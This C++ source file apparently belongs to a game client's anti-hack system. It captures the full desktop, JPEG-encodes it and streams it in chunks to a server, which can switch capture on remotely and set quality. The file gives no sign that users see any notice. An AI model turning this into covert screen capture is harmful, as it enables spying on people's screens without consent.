#include "stdafx.h"
#include "ScreenCapture.h"

#include <Gdiplus.h>
#include "Connection.h"
#include "HackServerProtocol.h"
#include "Log.h"
using namespace Gdiplus;
#pragma comment(lib, "gdiplus.lib")

CScreenCapture gScreenCapture;

CScreenCapture::CScreenCapture()
{
	this->State = 0;
	this->m_Quality = 100;
}

CScreenCapture::~CScreenCapture()
{
	
}

// get image encoder CLSID by its name
int CScreenCapture::GetEncoderClsid(WCHAR *format, CLSID *pClsid) 
{
    unsigned int num = 0,  size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo *pImageCodecInfo = (ImageCodecInfo *)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (unsigned int j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }    
    }
    free(pImageCodecInfo);
    return -1;
}

#define MAIN_WINDOW 0x00E8C578

bool CScreenCapture::getDesktopScreenShot(std::vector<unsigned char> & buffer, ULONG Quality)
{
    RECT r;
    HWND hMyWnd = GetDesktopWindow();//*(HWND*)(MAIN_WINDOW);//GetDesktopWindow();
    GetWindowRect(hMyWnd, &r);
    HDC dc = GetWindowDC(hMyWnd);
    int w = r.right - r.left;
    int h = r.bottom - r.top;
    int nBPP = GetDeviceCaps(dc, BITSPIXEL);
    HDC hdcCapture = CreateCompatibleDC(dc);
 
    // create the buffer for the screenshot
    BITMAPINFO bmiCapture = {
        sizeof(BITMAPINFOHEADER), w, -h, 1, nBPP, BI_RGB, 0, 0, 0, 0, 0,
    };
 
    // create a container and take the screenshot
    LPBYTE lpCapture;
    HBITMAP hbmCapture = CreateDIBSection(dc, &bmiCapture,
        DIB_PAL_COLORS, (LPVOID *)&lpCapture, NULL, 0);
 
    // failed to take it
    if (!hbmCapture) {
        DeleteDC(hdcCapture);
        DeleteDC(dc);
        return false;
    }
 
    // copy the screenshot buffer
    int nCapture = SaveDC(hdcCapture);
    SelectObject(hdcCapture, hbmCapture);
    BitBlt(hdcCapture, 0, 0, w, h, dc, 0, 0, SRCCOPY);
    RestoreDC(hdcCapture, nCapture);
    DeleteDC(hdcCapture);
    DeleteDC(dc);
 
    // create Gdiplus::Bitmap object
    Bitmap *pScreenShot = new Bitmap(hbmCapture, (HPALETTE)NULL);
	//gLog.Output(LOG_DEBUG,"Width = %d Height = %d PixelFormat = [%d]",pScreenShot->GetWidth(),pScreenShot->GetHeight(),getPixelControl(pScreenShot));
 

	/*IStream *stream = NULL;
    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
    if( !SUCCEEDED(hr) )
        return false;

	CLSID imageCLSID;
	GetEncoderClsid(L"image/jpeg", &imageCLSID);

    pScreenShot->Save(stream, &imageCLSID, 0);
    ULARGE_INTEGER liSize;
    IStream_Size(stream, &liSize);
    DWORD len = liSize.LowPart;
    IStream_Reset(stream);
    buffer.resize(len);
    IStream_Read(stream, &buffer[0], len);
    stream->Release();*/

    //encoding params
    ULONG quality = Quality;
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Guid  = EncoderQuality;
    encoderParams.Parameter[0].Type  = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &quality;
    CLSID imageCLSID;
    GetEncoderClsid(L"image/jpeg", &imageCLSID);
 
    // create empty stream
    IStream* pIStream = NULL;
    bool ok = (CreateStreamOnHGlobal(NULL, TRUE, (LPSTREAM*)&pIStream) == S_OK);
    if (ok) {
        // save imaget into it
        ok = (pScreenShot->Save(pIStream, &imageCLSID, &encoderParams) == Ok);
        if (ok) {
            // get the size of the stream
            ULARGE_INTEGER ulnSize;
            LARGE_INTEGER lnOffset;
            ULONG ulBytesRead = 0;
            lnOffset.QuadPart = 0;
            ok = (pIStream->Seek(lnOffset, STREAM_SEEK_END, &ulnSize) == S_OK);
            if (ok) {
                // now move the pointer to the beginning of the file
                ok = (pIStream->Seek(lnOffset, STREAM_SEEK_SET, NULL) == S_OK);
                if (ok) {
                    buffer.resize(ulnSize.QuadPart);
                    ok = (pIStream->Read(buffer.data(), buffer.size(), &ulBytesRead) == S_OK);
                }
            }
            pIStream->Release();
        }
    }
    
    delete pScreenShot;
    DeleteObject(hbmCapture);
 
    return true;
}

void CScreenCapture::CaptureScreen()
{
	if (this->State == 0)
	{
		return;
	}

	ULONG_PTR gdiplusToken;
	GdiplusStartupInput gdiplusStartupInput;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	// make screenshot
	std::vector<unsigned char> buffer;
	if (!this->getDesktopScreenShot(buffer,this->m_Quality) || buffer.empty()) {
		gLog.Output(LOG_DEBUG,"SOMETHING WENT WRONG. Terrible sorry...");
	} else {
		this->SendScreenShot(buffer);
	}

	GdiplusShutdown(gdiplusToken);
}

void CScreenCapture::SendScreenShot(std::vector<unsigned char> & buffer)
{
	int SendIndex = 0;
	int i=0;
	for(i = 0; i < buffer.size();)
	{
		BYTE send[8192*2];
		//BYTE send[MAX_BUFF_SIZE/2];

		PMSG_SCREEN_SEND pMsg;

		pMsg.header.set(0x10/*+(rand()%10)*/,0);

		int size = sizeof(pMsg);

		pMsg.count = 0;
		pMsg.bufferSize = buffer.size();
		pMsg.index = SendIndex++;

		PMSG_SCREEN info;

		//for(int j = 0; j < MAX_BUFF_SIZE/2-20; j ++)
		for(int j = 0; j < 8192*2-20; j ++)
		{
			if (i>=buffer.size())
			{
				break;
			}

			info.value = buffer[i];

			memcpy(&send[size],&info,sizeof(info));
			size += sizeof(info);

			pMsg.count++;
			//TotalSend++;
			i++;
		}

		pMsg.header.size[0] = SET_NUMBERHB(size);

		pMsg.header.size[1] = SET_NUMBERLB(size);

		memcpy(send,&pMsg,sizeof(pMsg));
		//gConnection.DataSend((BYTE*)&pMsg,pMsg.header.size);

		//while (true)
		//{
		//	Sleep(0);
		//	if (gConnection.CheckSendSize() == 0)
		//	{
		//		gConnection.DataSend(send,size);
		//		gLog.Output(LOG_DEBUG, "Send");
		//		break;
		//	}
		//	else
		//	{
		//		//gLog.Output(LOG_DEBUG,"LolSize = %d",gConnection.CheckSendSize());
		//	}
		//}

		while(true)
		{
			if (gConnection.CheckSendSize() > 0)
			{
				Sleep(1);
			}
			else
			{
				break;
			}
		}

		gConnection.DataSend(send,size);
		//gLog.Output(LOG_DEBUG,"Size = %d!",size);
		//Sleep(3);
	}
}

void CScreenCapture::RecvSetState(PMSG_SCREENSTATE_RECV* lpMsg)
{
	if (lpMsg->value == 1)
	{
		this->m_Quality = lpMsg->quality;

		if (lpMsg->quality == 100 && this->State != 1)
		{
			HDC hDCScreen =  GetDC(NULL);
			int Horres = GetDeviceCaps(hDCScreen,  HORZRES);
			int Vertres = GetDeviceCaps(hDCScreen,  VERTRES);
			ReleaseDC(NULL, hDCScreen);

			PMSG_SCREENDATA_SEND pMsg;

			pMsg.header.set(0x11,sizeof(pMsg));

			pMsg.Width = Horres;
			pMsg.Height = Vertres;

			gConnection.DataSend((BYTE*)&pMsg,pMsg.header.size);
		}
	}

	this->State = lpMsg->value;
}